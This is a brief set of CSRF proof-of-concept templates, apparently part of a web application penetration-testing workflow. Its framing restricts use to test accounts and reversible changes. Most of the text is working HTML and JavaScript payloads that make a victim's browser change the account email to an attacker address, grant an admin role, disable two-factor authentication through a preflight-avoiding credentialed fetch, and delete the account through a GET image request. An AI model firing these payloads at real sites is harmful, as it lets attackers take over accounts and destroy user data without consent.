# CSRF PoC templates (step 4)
# Serve from an attacker origin; load in a browser carrying the victim's cookies (test account).
# Record which template + whether the change fired in poc/<id>/.

## Auto-submitting form (classic; works for simple content types)
```html
<form action="https://TARGET/account/email" method="POST" id="f">
  <input type="hidden" name="email" value="attacker@evil.example">
</form>
<script>document.getElementById('f').submit()</script>
```

## multipart/form-data
```html
<form action="https://TARGET/upload" method="POST" enctype="multipart/form-data" id="f">
  <input type="hidden" name="role" value="admin">
</form><script>f.submit()</script>
```

## fetch with credentials (only if the endpoint accepts a simple/again CORS-permitted request)
```html
<script>
fetch('https://TARGET/api/settings', {
  method:'POST', credentials:'include',
  headers:{'Content-Type':'text/plain'},          // simple header to avoid preflight
  body:'{"twofa":false}'
});
</script>
```
Note: if the endpoint requires `application/json` AND validates it, a cross-origin page triggers a
CORS preflight it can't satisfy → that content-type requirement is itself a CSRF defense (verify.md).

## GET-based (sensitive state change via GET)
```html
<img src="https://TARGET/account/delete?confirm=1">
```

Use a benign/reversible change on a TEST account. Capture the response/'state changed' evidence.
